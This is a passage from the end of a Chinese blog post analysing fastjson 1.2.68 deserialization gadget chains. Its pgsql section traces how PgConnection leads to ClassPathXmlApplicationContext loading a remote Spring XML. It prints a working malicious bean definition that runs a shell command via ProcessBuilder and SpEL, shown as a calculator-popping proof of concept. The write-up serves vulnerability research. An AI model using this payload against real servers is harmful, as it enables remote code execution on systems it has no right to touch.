<h4 id="2-5-1-PgConnection"><a href="#2-5-1-PgConnection" class="headerlink" title="2.5.1 PgConnection"></a>2.5.1 PgConnection</h4><div align=center><img src="/img/fastjson 1.2.68漏洞分析/39.png" alt="39" style="zoom:50%;" /></div>
构造方法：
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">PgConnection</span><span class="params">(HostSpec[] hostSpecs, String user, String database, Properties info, String url)</span> <span class="keyword">throws</span> SQLException</span></span><br></pre></td></tr></table></figure>
在PgConnection的构造方法中，执行到`ConnectionFactory.openConnection()`方法

<div align=center><img src="/img/fastjson 1.2.68漏洞分析/40.png" alt="40" style="zoom:50%;" /></div>

<p>在ObjectFactory#instantiate方法中，将传入的类名即<code>org.springframework.context.support.ClassPathXmlApplicationContext</code>进行实例化</p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/41.png" alt="41" style="zoom:50%;" /></div>

<h4 id="2-5-2-ClassPathXmlApplicationContext实例化"><a href="#2-5-2-ClassPathXmlApplicationContext实例化" class="headerlink" title="2.5.2 ClassPathXmlApplicationContext实例化"></a>2.5.2 ClassPathXmlApplicationContext实例化</h4><div align=center><img src="/img/fastjson 1.2.68漏洞分析/42.png" alt="42" style="zoom:50%;" /></div>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ClassPathXmlApplicationContext &lt;init&gt;</span><br><span class="line">- AbstractApplicationContext refresh</span><br><span class="line">- AbstractApplicationContext obtainFreshBeanFactory</span><br><span class="line">- AbstractRefreshableApplicationContext refreshBeanFactory</span><br><span class="line">- AbstractXmlApplicationContext loadBeanDefinitions</span><br></pre></td></tr></table></figure>

<div align=center><img src="/img/fastjson 1.2.68漏洞分析/43.png" alt="43" style="zoom:50%;" /></div>

<p>接下来遍历<code>configLocations</code>，开始获取资源，如图先后判断了字符串是否是 <code>classpath*:</code>、<code>war:</code>这种格式；匹配资源字符串的格式后，最终因为使用了http://的格式，返回了<code>URL</code>对象</p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/44.png" alt="44" style="zoom:50%;" /></div>

<div align=center><img src="/img/fastjson 1.2.68漏洞分析/45.png" alt="45" style="zoom:50%;" /></div>
构造spring bean配置的xml
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;work&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>/bin/sh<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>open /System/Applications/Calculator.app<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;do&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123;work.start()&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/46.png" alt="46" style="zoom:50%;" /></div>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/search/">搜索</a></li>
         
          <li><a href="/categories/">分类</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/link">链接</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/about/">关于</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-AutoCloseable"><span class="toc-number">1.</span> <span class="toc-text">1. AutoCloseable</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-Demo%E6%B5%8B%E8%AF%95"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 Demo测试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-1-%E8%AE%A1%E7%AE%97%E5%99%A8%E6%B5%8B%E8%AF%95"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.1.1 计算器测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%B1%BB%E7%9A%84%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.2.</span> <span class="toc-text">1.1.2 反序列化中类的构造方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-AutoCloseable%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 AutoCloseable反序列化调试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-1-checkAutoType%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.2.1 checkAutoType流程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-2-1-1-safeModeMask"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">1.2.1.1 safeModeMask</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-2-1-2-%E5%86%85%E7%BD%AE%E7%9A%84mappings"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">1.2.1.2 内置的mappings</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-2-deserializer"><span class="toc-number">1.2.2.</span> <span class="toc-text">1.2.2 deserializer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-3-%E5%86%8D%E6%AC%A1%E8%BF%9B%E5%85%A5checkAutoType"><span class="toc-number">1.2.3.</span> <span class="toc-text">1.2.3 再次进入checkAutoType</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.</span> <span class="toc-text">2. 利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-oracle-jdbc-rowset-OracleJDBCRowSet"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 oracle.jdbc.rowset.OracleJDBCRowSet</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1-fastjson1-2-68"><span class="toc-number">2.1.1.</span> <span class="toc-text">2.1.1 fastjson1.2.68</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-3-fastjson1-2-50"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.1.3 fastjson1.2.50</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-FileOutputStream"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 FileOutputStream</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-1-%E8%8E%B7%E5%8F%96%E4%B8%8D%E5%88%B0%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1 获取不到构造方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-2-%E5%85%AC%E5%BC%80%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2 公开的利用链</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-Mysql%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 Mysql利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-1-Mysql-connector-5-1-x"><span class="toc-number">2.3.1.</span> <span class="toc-text">2.3.1 Mysql connector 5.1.x</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-1-1-%E8%A7%A6%E5%8F%91mysql%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.3.1.1.</span> <span class="toc-text">2.3.1.1 触发mysql连接</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-1-2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.3.1.2.</span> <span class="toc-text">2.3.1.2 反序列化</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-2-Mysql-Connector-6-0-x"><span class="toc-number">2.3.2.</span> <span class="toc-text">2.3.2 Mysql Connector 6.0.x</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-2-1-%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">2.3.2.1 构造方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-2-2-%E8%A7%A6%E5%8F%91mysql%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.3.2.2.</span> <span class="toc-text">2.3.2.2 触发mysql连接</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.3.2.3.</span> <span class="toc-text">2.3.2.3 反序列化</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-3-Mysql-Connector-8-x"><span class="toc-number">2.3.3.</span> <span class="toc-text">2.3.3 Mysql Connector 8.x</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-Commons-io%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 Commons-io利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-1-ref"><span class="toc-number">2.4.1.</span> <span class="toc-text">2.4.1 $ref</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-2-%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="toc-number">2.4.2.</span> <span class="toc-text">2.4.2 写入文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-4-2-1-XmlStreamReader"><span class="toc-number">2.4.2.1.</span> <span class="toc-text">2.4.2.1 XmlStreamReader</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-4-2-1-TeeInputStream"><span class="toc-number">2.4.2.2.</span> <span class="toc-text">2.4.2.1 TeeInputStream</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-4-2-3-%E8%A7%A6%E5%8F%91%E6%B5%81%E7%A8%8B"><span class="toc-number">2.4.2.3.</span> <span class="toc-text">2.4.2.3 触发流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-4-2-4-%E6%97%A0%E6%B3%95%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="toc-number">2.4.2.4.</span> <span class="toc-text">2.4.2.4 无法写入文件内容</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-4-2-5-%E4%BF%AE%E6%94%B9%E5%88%A9%E7%94%A8%E9%93%BE%E4%B8%ADWriteOutputStream%E7%9A%84%E5%8F%82%E6%95%B0"><span class="toc-number">2.4.2.5.</span> <span class="toc-text">2.4.2.5 修改利用链中WriteOutputStream的参数</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-3-%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">2.4.3.</span> <span class="toc-text">2.4.3 读文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-pgsql%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.5.</span> <span class="toc-text">2.5 pgsql利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-5-1-PgConnection"><span class="toc-number">2.5.1.</span> <span class="toc-text">2.5.1 PgConnection</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-5-2-ClassPathXmlApplicationContext%E5%AE%9E%E4%BE%8B%E5%8C%96"><span class="toc-number">2.5.2.</span> <span class="toc-text">2.5.2 ClassPathXmlApplicationContext实例化</span></a></li></ol></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=fastjson 1.2.68漏洞分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.68漏洞分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=fastjson 1.2.68漏洞分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=fastjson 1.2.68漏洞分析&body=Check out this article: http://blog.ninefiger.top/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.68漏洞分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.68漏洞分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.68漏洞分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.68漏洞分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=fastjson 1.2.68漏洞分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=fastjson 1.2.68漏洞分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2017-2022
    ninefiger
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/search/">搜索</a></li>
         
          <li><a href="/categories/">分类</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/link">链接</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/about/">关于</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


</body>
</html>
